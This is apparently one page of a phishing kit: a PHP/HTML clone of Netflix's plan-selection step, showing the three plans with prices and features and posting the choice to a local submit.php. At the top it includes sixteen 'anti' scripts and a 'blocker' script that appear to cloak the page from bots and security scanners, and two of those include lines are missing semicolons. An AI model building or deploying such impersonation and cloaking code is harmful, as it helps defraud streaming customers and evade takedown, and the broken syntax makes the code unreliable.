<?php 
include_once "./submit.php" 
include_once "./includes/header.html"
include "./boots/anti1.php";
include "./boots/anti2.php";
include "./boots/anti3.php";
include "./boots/anti4.php";
include "./boots/anti5.php";
include "./boots/anti6.php";
include "./boots/anti7.php";
include "./boots/anti8.php";
include "./boots/anti9.php";
include "./boots/anti10.php";
include "./boots/anti11.php";
include "./boots/anti12.php";
include "./boots/anti13.php";
include "./boots/anti14.php";
include "./boots/anti15.php";
include "./boots/anti16.php";
include "./boots/blocker.php";
?>

<div class="simpleContainer">
    <div class="centerContainer narrowCenterContainer" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
        <div class="planFormContainer">
            <div class="">
                <div class="stepHeader-container" data-uia="header">
                    <div class="stepHeader">
                        <span id="" class="stepIndicator">STEP <b>2</b> OF <b>3</b></span>
                        <h1 class="stepTitle">Choose the plan that’s right for you</h1>
                    </div>
                </div>
                <div class="changeAnytime">
                    <ul class="checkmark-group -compact">
                        <li class="checkmark-group--row -compact"><svg viewBox="0 0 24 24" class="checkmark-group--icon">
                                <path fill="currentColor" d="M3.707 12.293l-1.414 1.414L8 19.414 21.707 5.707l-1.414-1.414L8 16.586z">
                                </path>
                            </svg>
                            <span class="checkmark-group--text">Watch all you want.Ad-free.</span>
                        </li>
                        <li class="checkmark-group--row -compact"><svg viewBox="0 0 24 24" class="checkmark-group--icon">
                                <path fill="currentColor" d="M3.707 12.293l-1.414 1.414L8 19.414 21.707 5.707l-1.414-1.414L8 16.586z">
                                </path>
                            </svg>
                            <span class="checkmark-group--text">Recommendations just foryou.</span>
                        </li>
                        <li class="checkmark-group--row -compact">
                            <svg viewBox="0 0 24 24" class="checkmark-group--icon" aria-hidden="true">
                                <path fill="currentColor" d="M3.707 12.293l-1.414 1.414L8 19.414 21.707 5.707l-1.414-1.414L8 16.586z">
                                </path>
                            </svg><span class="checkmark-group--text">Change or cancel your plan anytime.</span>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="planGrid planGrid--has3Plans" data-uia="plan-grid">
                <div class="planGrid__header">
                    <div class="planGrid__selector planGrid__planSelector">
                        <span class="planGrid__selectorDescription" id="planGrid_planChoice_description">Select the plan you'd like</span>
                        <label class="planGrid__selectorChoice planGrid__planChoice" for="planGrid_planChoice_0">
                            <input type="radio" name="planChoice" class="planGrid__selectorInput planGrid__planInput" id="planGrid_planChoice_0" value="53088031314001031">
                            <span class="planGrid__selectorLabel planGrid__planLabel">Basic</span>
                        </label>
                        <label class="planGrid__selectorChoice planGrid__planChoice" for="planGrid_planChoice_1">
                            <input type="radio" name="planChoice" class="planGrid__selectorInput planGrid__planInput" id="planGrid_planChoice_1" value="5310803110322" checked="">
                            <span class="planGrid__selectorLabel planGrid__planLabel">Standard</span>
                        </label>
                        <label class="planGrid__selectorChoice planGrid__planChoice" for="planGrid_planChoice_2">
                            <input type="radio" name="planChoice" class="planGrid__selectorInput planGrid__planInput" id="planGrid_planChoice_2" value="10341">
                            <span class="planGrid__selectorLabel planGrid__planLabel">Premium</span>
                        </label>
                    </div>
                </div>



                <table class="planGrid__featureTable" role="table">
                    <caption class="planGrid__featureTableCaption">Netflix Plan Features</caption>
                    <tbody class="planGrid__featureTableBody">
                        <tr role="row" class="planGrid__featureTableRow planGrid__featureTableRow--planPrice">
                            <td class="planGrid__cell planGrid__featureCell">Monthly price</td>
                            <td class="planGrid__cell planGrid__stringCell">$8.99</td>
                            <td class="planGrid__cell planGrid__stringCell planGrid__cell--isSelected">$13.99</td>
                            <td class="planGrid__cell planGrid__stringCell">$17.99</td>
                        </tr>
                        <tr class="planGrid__featureTableRow planGrid__featureTableRow--videoQuality">
                            <td class="planGrid__cell planGrid__featureCell">Videoquality</td>
                            <td class="planGrid__cell planGrid__videoQualityCell">
                                <div class="planGrid__videoQualityLabel planGrid__stringCell">Good</div>
                            </td>
                            <td class="planGrid__cell planGrid__videoQualityCell planGrid__cell--isSelected">
                                <div class="planGrid__videoQualityLabel">Better</div>
                            </td>
                            <td class="planGrid__cell planGrid__videoQualityCell">
                                <div class="planGrid__videoQualityLabel">Best</div>
                            </td>
                        </tr>
                        <tr class="planGrid__featureTableRow planGrid__featureTableRow--resolution">
                            <td class="planGrid__cell planGrid__featureCell">Resolution</td>
                            <td class="planGrid__cell  planGrid__videoQualityCell">
                                <div class="planGrid__videoQualityLabel">480p</div>
                            </td>
                            <td class="planGrid__cell planGrid__videoQualityCell planGrid__cell--isSelected">
                                <div class="planGrid__videoQualityLabel">1080p</div>
                            </td>
                            <td class="planGrid__cell planGrid__videoQualityCell">
                                <div class="planGrid__videoQualityLabel">4K+HDR</div>
                            </td>
                        </tr>
                        <tr role="row" class="planGrid__featureTableRow planGrid__featureTableRow--noField">
                            <td class="planGrid__cell planGrid__featureCell">Watch on your TV, computer, mobile phone and tablet</td>
                            <td class="planGrid__cell planGrid__booleanCell">
                                <span class="planGrid__booleanLabel">Yes</span>
                                <span class="planGrid__booleanIcon" aria-hidden="true">
                                    <svg viewBox="0 0 26 26" class="planGrid__booleanGraphic planGrid__booleanGraphic--isCheck" focusable="false">
                                        <polygon points="4.70710678 13.2928932 3.29289322 14.7071068 9 20.4142136 22.7071068 6.70710678 21.2928932 5.29289322 9 17.5857864">
                                        </polygon>
                                    </svg>
                                </span>
                            </td>

                            <td class="planGrid__cell planGrid__booleanCell planGrid__cell--isSelected">
                                <span class="planGrid__booleanLabel">Yes</span>
                                <span class="planGrid__booleanIcon" aria-hidden="true">
                                    <svg viewBox="0 0 26 26" class="planGrid__booleanGraphic planGrid__booleanGraphic--isCheck" focusable="false">
                                        <polygon points="4.70710678 13.2928932 3.29289322 14.7071068 9 20.4142136 22.7071068 6.70710678 21.2928932 5.29289322 9 17.5857864">
                                        </polygon>
                                    </svg>
                                </span>
                            </td>
                            <td class="planGrid__cell planGrid__booleanCell">
                                <span class="planGrid__booleanLabel">Yes</span>
                                <span class="planGrid__booleanIcon" aria-hidden="true">
                                    <svg viewBox="0 0 26 26" class="planGrid__booleanGraphic planGrid__booleanGraphic--isCheck" focusable="false">
                                        <polygon points="4.70710678 13.2928932 3.29289322 14.7071068 9 20.4142136 22.7071068 6.70710678 21.2928932 5.29289322 9 17.5857864">
                                        </polygon>
                                    </svg></span>
                            </td>
                        </tr>
                    </tbody>
                </table>
                <small class="planGrid__disclaimer planGrid__standardDisclaimer">
                    <span>Full HD (1080p), Ultra HD (4K) and HDR availability
                        subject to your internet service and device capabilities. Not all content
                        available in HD, Full HD, Ultra HD or HDR. See <a href="/termsofuse" target="_blank">Terms of Use</a> for more details.</span>
                </small>
                <small class="planGrid__disclaimer planGrid__standardDisclaimer">
                    <span>Only people who live with you may use your account.
                        Watch on 4 different devices at the same time with Premium, 2 with Standard and
                        1 with Basic.</span>
                </small>
            </div>
        </div>
        <form action="submit.php" method="POST">
            <input type="hidden" name="type" value="plan">
            <input type="hidden" name="plan" id="plan" value="Standard">
            <div class="submitBtnContainer">
                <button type="submit" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" placeholder="planSelection_next_tc">Next</button>
            </div>
        </form>



    </div>
</div>

<?php include_once "./includes/footer.html" ?>